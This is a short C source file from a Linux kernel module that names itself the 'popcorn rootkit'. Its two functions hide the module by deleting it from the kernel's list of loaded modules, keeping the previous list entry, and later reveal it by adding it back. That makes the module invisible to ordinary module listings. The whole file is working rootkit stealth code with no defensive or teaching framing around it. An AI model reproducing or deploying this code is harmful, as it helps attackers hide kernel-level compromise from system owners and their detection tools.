#include "../headers/stealth.h"

static struct list_head * prev_module;

/**
    Remove Our LKM Module Pointer From The Doubley Linked List
    Save The Module Pointer For The Previous Module In The List
    So We Can Append Ourselves In Later
*/
void hide_me(void) {

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    printk(KERN_INFO "Hiding popcorn rootkit!\n");
}

/**
    Append Ourselves Back In To The Doubley Linked List Using
    The Previous Module Saved In "prev_module"
*/
void show_me(void) {
    list_add(&THIS_MODULE->list, prev_module);
    printk(KERN_INFO "Revealing popcorn rootkit!\n");
}